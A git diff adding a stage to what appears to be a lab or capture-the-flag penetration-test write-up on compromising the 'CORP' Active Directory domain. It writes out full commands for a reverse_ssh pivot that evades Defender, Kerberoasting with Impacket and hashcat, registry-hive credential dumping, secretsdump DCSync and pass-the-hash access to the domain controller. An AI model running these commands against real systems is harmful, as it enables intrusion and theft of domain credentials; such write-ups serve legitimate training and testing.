@@ -147,6 +147,30 @@ Using Remmina, the consultant connected to the first machine, passing `mohammad.
 
 ## Stage 2: Compromising the CORP Domain
 
+The corpUsername.ovpn only provided access to the .21 and .22 machines, which meant any further enumeration for example against the DC at .102 would be impossible as the attack machine would not be able to reach it. Furthermore, the WRK1 and WRK2 machines had Microsoft Defender active so dropping any sort of enumeration tools on them would be blocked, and there was no way to disable this as the low privilege users.
+
+To proceed, the client.exe binary from reverse_ssh was copied over to the WRK1 machine and then run. As this is a relatively unknown tool written in Go, and the system had no AppLocker policies or anything, the tool ran successfully and a client connection was established. This in effect serves as an SSH server on the machine, so the consultant was able to set up a SOCKS proxy with: `ssh -fN -D 9050 -J localhost:443 [CLIENT_GUID]`. This would then allow tools to be run with ProxyChains, which by default will use a local 9050 proxy.
+
+With working Active Directory credentials, the next step taken was enumerating AD itself for any accounts that might grant higher privileges. The [GetUserSPNs script from Impacket](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) was run as so: `proxychains python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.200.116.102 corp.thereserve.loc/mohammad.ahmed:[REDACTED] -request`. This provided crackable tickets for five service accounts, in the format: `$krb5tgs$23$*svcBackups$CORP.THERESERVE.LOC$corp.thereserve.loc/svcBackups*$73b17bc85e3........`
+
+Taking these hashes offline and cracking them with hashcat (using a windows machine with a GPU), the command: `hashcat.exe -m 13100 .\hash .\rockyou.txt` revealed the password for the service account user `svcScanning`. 13100 is the code for 'Kerberos 5, etype 23, TGS-REP' hashes.
+
+Testing different machines that could be reached with svcScanning, it was found the tier 1 machines in the corp domain, Server1 and Server2: `proxychains evil-winrm -u svcScanning -p [REDACTED] -i 10.200.116.31`, the Server1 and Server2 being 10.200.116.31 and .32 respectively. Furthermore, svcScanning had full privileges on both machines, an effective local administrator. However, this user was unable to access the CORPDC on .102.
+
+To perform further enumeration, the sam, system and security hives were dumped from each machine. This was done with the following commands:
+
+```
+reg save hklm\sam sam
+reg save hklm\system system
+reg save hklm\security security
+```
+
+As the connection to the server workstations was over evil-winrm, the consultant could use `download sam` to copy the local file back to the attackbox. With the hives copied back, another script from impacket, secretsdump, was used to extract hashes and stored credentials: `python3.9 /opt/impacket/examples/secretsdump.py -sam sam -system system -security security local`. With this, from the output from the hives on Server1, the password for the **svcBackup** user was discovered.
+
+The svcBackup user had DC Sync rights [TODO], which meant all secrets of the domain could be dumped. This was done again with secretsdump: `proxychains python3.9 /opt/impacket/examples/secretsdump.py -just-dc svcbackups:[REDACTED]@10.200.116.102`. The result were the NTLM hashes for all CORP users, including T0 domain admins.
+
+Using one of these DAs, T0_josh.sutton, the consultant gained access to the CORPDC server: `proxychains evil-winrm -u t0_josh.sutton -H [REDACTED] -i 10.200.116.102`. As a DA, and with full access to every machine in CORP, the CORP domain was at this point completely compromised.
+
 ## Stage 3: Compromising the Forest via the Root DC
 
 ## Stage 4: Access to the Swift system and demonstrating impact
